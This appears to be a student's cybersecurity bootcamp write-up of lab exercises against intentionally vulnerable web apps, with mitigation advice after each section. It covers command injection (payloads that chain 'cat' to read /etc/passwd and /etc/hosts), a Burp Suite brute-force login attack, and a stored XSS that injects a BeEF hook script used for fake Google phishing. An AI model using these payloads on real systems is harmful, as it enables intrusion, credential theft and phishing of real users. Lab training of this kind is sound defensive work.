# Web Vulnerabilities And Hardening
(Cybersecurity Bootcamp Unit 15 Assignment)

### Topics Covered Will Include:
- Web application vulnerability assessments
- Injection
- Brute force attacks
- Broken authentication
- Burp Suite
- Web proxies
- Directory traversal
- Dot dot slash attacks
- Beef
- Cross-site scripting
- Malicious payloads

### Content will include steps on how to test the vulnerabilities of a web application using a virtual machine.  
Steps will include:  

- Detailing how to setup and access the applications
- A walkthrough of how the application is intended to work
- Task that will test the application for vulnerabilities

### To launch the environment with several vulnerable web applications, complete the following:

Use the command line to run Vagrant with the following command: 
- vagrant up
- Then, open terminal inside Vagrant and run the following on the command line: 
  - `cd ./Documents/web-vulns && docker-compose up`

While the output might look like the task is still running, this script has launched several vulnerable web applications that we will use throughout this assignment.  Leave this page open and running then open a another terminal window to be used later.


# Web Application Vulnerability One: Command Injection:

Open your browser and navigate to:

http://192.168.13.25

- Login credentials:

    * User Name: admin
    * Password:  password

Next select:
*Command Injection*
option from the menu on the left. (See image below)


![TODO: Update the path with the name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/DVWA/command%20injection%20shot.png)

This page is a new web application built by Replicants in order to enable their customers to ping an IP address. 
The web page will return the results of the ping command back to the user.  You will run a series of commands 
to walkthrough the intended purpose of the web application.
      
      
**Payload One**

To test the webpage start by pinging the IP address:
`8.8.8.8`
and press submit to see the results display on the web application.


![TODO: Update the path with the name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/DVWA/Ping%208.8.8.8.png)


![TODO: Update the path with the name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/DVWA/Results%20of%20Ping%20of%208.8.8.8.png)

  - Behind the scenes, when you select Submit, the IP you type in the field is injected into the command that is run against the Replicants webserver. The specific     command that ran on the webserver is `ping IP address` and `IP addresss: 8.8.8.8` is the `field value` that is injected into that command.   

**Payload Two**

Test Replicant webserver to see if it can be manipulated by inputing a different payload in the field by
`Typing: 8.8.8.8 && pwd`
   

![TODO: Update the path with the name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/DVWA/PWD%20Results.png) 
   
- The ping results above are the result of the second command used `pwd`.  The `injection` of `pwd` into the command line above is an example of how   you implement a:
  - Command Injection Attack

It should be noted that a Command Injection Attack is dependent on the web application taking user input to run a command against an operating system.

Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:

- /etc/passwd
- /etc/hosts
   
**Hint:** Test out commands directly on the command line in terminal to help design your payloads.

-  /etc/passwd
   - `Dot-Dot-Slash Payload One: 8.8.8.8 && cat ../../../../../etc/passwd`

![TODO:  Update the path with the name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/DVWA/Result%20for%20:etc:passwd.png)

-  /etc/hosts
   - `Dot-Dot-Slash Payload Two: 8.8.8.8 && cat ../../../../../etc/hosts`

![TODO: Update the path with name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/DVWA/Results%20for%20etc:hosts.png)

## Recommended mitigation strategies:

-  Strong input validation ie. whitelist certain commands like pwd and ls to only allow these input strings.
-  Restrict privilege to only the minimum needed to accomplish task which can in turn restrict a threat actor if they do        manage to inject commands.
-  Update and patch applications often.


# Web Application Vulnerability Two: Brute Force

Complete the following steps to set up the activity:

### Step One:
  
Navigate to http://192.168.13.25

The page should look like the following:


![TODO: Update the path with name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/bWapp%20install.png)

Click `"here"` to install bWapp 🐝 at the bottom of the page.

Once the installation is a success, use the following credentials to login:

- Login credentials:

    * User Name: bee
    * Password:  bug
    * Set the security level: low

This will take you to the following page:


![TODO: Update the path with name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/bWapp%202nd%20page.png)

## Step Two

To access the application where we will perform our activity, enter in the following URL: 

http://192.168.13.35/ba_insecure_login_1.php

This will take you to the following page:


![TODO: Update the path with the name of your diagram](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/bWapp%20broke%20auth.png)

-  This page is an administrative web application that serves as a simple login page. An administrator enters their username    and password and selects Login.

    * If the user/password combination is correct, it will return a successful message.
    * If the user/password combination is incorrect, it will return the message, "Invalid credentials."

We will use this page with two other applications called `Burp Suite & FoxyProxy` to complete this activity.
-  If you have not already installed `Burp Suite` or the `FoxyProxy Add-On`[Click Here](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Burp%20Suite%20Instructions.pdf) for setup instructions.

      * Use the web application tool Burp Suite, specifically the Burp Suite Intruder feature, to determine if any of the administrator accounts are vulnerable to a brute force attack on this web application.

      * You've been provided with a list of administrators and the breached passwords below to run using Burp Suite & FoxyProxy:
      * [List of Administrators](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/listofadmins.txt)
      * [List of Breached Passwords](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/breached_passwords.txt)


### Results Of Utilizing Burp Suite with FoxyProxy Add-On

-  The login credentials below were used to test the use of Burp Suite & FoxyProxy
    * User Name: test-user
    * Password: password


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/test-user%20bWapp%20.png)


The image below shows data intercepted after running the user-name and password above.  It also depicts the data being sent to Intruder and the attack type as the **`Cluster Bomb.`** By using the menu on the right side of the image the positions were cleared and new positions set for **`user-name and password`** before setting the payloads which is the next step before running the attack.


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Login%20and%20Password%20Position.png)


### Setting Payloads

-  Now that the target has been identified and the positions set above the payloads need to be defined.
    
    - Click Payloads tab, choose Payload type as Simple list
    
      - **Payload One** Add login user ID from List of Administrators file into payload set 1
    
      - **Payload Two** Add password from Breached list of Passwords file into payload set 2

Click **`Start Attack`**

After running the attack results show one `User-Name & Password` at a varying length from the others **`tonystark`** and **`I am Iron Man`**


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/tony%20stark%20highlight%20shot.png)


By turning off intercept and FoxyProxy the user-name and password were ran in the bWapp portal and the combination of **`tonystark`** and **`I am Iron Man`** did result in a successful login.


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/tony%20login%20shot.png)

## Recommended Mitgation Strategies:

-  Longer more complex password requirements
-  Requiring passwords be changed after a specified period of time (ie. 90 days)
-  Multi-factor authentication
-  Lock-out after specified number of failed login attempts



# Web Application Vulnerability Three: Cross-Site Scripting


[Click Here For Setup Instructions](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/BeEF%20setup.pdf)


**The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.**

While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.

An attacker takes a small snippet of code, called a **`BeEF Hook`**, and determines a way to add this code into a target website. This is commonly done by **`cross-site scripting.`**

When subsequent users access the infected website, the users' browsers become hooked.

Once a browser is hooked, it is referred to as a **`zombie.`** A zombie is an infected browser that awaits instructions from the BeEF control panel.

-  The BeEF control panel has hundreds of exploits that can be launch against the hooked victims, including:
    -  Social engineering attacks
    -  Stealing confidential data from the victim's machine
    -  Accessing system and network information from the victim's machine

**BeEF includes a feature to test out a simulation of an infected website.**

To access this simulated infected website, locate the following sentence on the BeEF control panel: To begin with, you can point a browser towards the basic demo page here, or the **`advanced version here.`**

Click the second **`"here"`** for the advanced version.  This will open the following website that has been infected with a BeEF hook.


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/BeEF%20Second%20Here.png)


This opens the page seen below which has been infected with a BeEF hook.


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/BeEF%20Hook.png)


**Once you have pulled up the infected webpage above your browser has been `HOOKED!`**

Return to your control panel and on the left side you will notice your browser is infected and shows under `"Hooked Browsers"`


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Hooked%20Browser%20Command%20Tab.png)


Click on the hooked browser **127.0.0.2** and then the **Commands** tab where you will see a list of hundreds of exploits that can be ran agaisnt the hooked browser. Note, not every exploit will work but many will!


**First Exploit: Social Engineering**


-  To access this exploit select the Google Phishing under Social Engineering (see below).


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/google%20phishing.png)


The results are displayed on the right side of the page under `"Google Phishing"` (see above).


Click **`Execute`** on the bottom right of the screen to launch the exploit.


-  After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google        login page.  A victim could easily mistake this for a real login prompt. (see below)


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Google%20Login%20Page.png)


-  Use the credentials below to login into the fake Google page.

      - **Username: hackeruser**
      - **Password: hackerpass**


Return to the BeEF contrl panel and in the center panel select the first option labeled **`command 1`** and you will be able to the user name and password have been captured on the right side of the screen under command results (see below).


![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Command%20One%20Results.png)


### Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.


-  The page you will test is the Replicants Stored XSS application which was used the first day of this unit:  
  
      -  http://192.168.13.25/vulnerabilities/xss_s/

      -  The BeEF hook, which was returned after running the sudo beef command was: http://127.0.0.1:3000/hook.js

      -  The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>

![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Unfinished%20Script.png)

A limitation was discovered while trying to inject the payload script that would not allow the full script to be typed into the message box (see above).

**The work around to this limitation was to change the maxlength of the message box field in the original source code to allow the input of the whole payload code into the message box.**

![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Change%20content%20legnth%20to%20100.png)

Image below shows that the code was changed and the full script is now able to fit in the message box field.

![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Cross%20Site%20Finished%20Script.png)


### BeEF Exploits Against Replicants Webpage


    - Social Engineering
      - Pretty Theft
      
      
![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/session%20timeout%20shot.png)
      

    - Social Engineering
      - Fake Notification Bar
      

![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Fake%20Notification.png)


    - Host
      -  Get Geolocation (Third Party)

![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/geolocation%203rd%20party%20shot.png)

## Recommendations For Mitigation

-  Sanitize your data by examining and removing unwanted data such as HTML tags that can be unsafe.
-  Validate user input by treating anthing that originates from outside the system as untrusted.
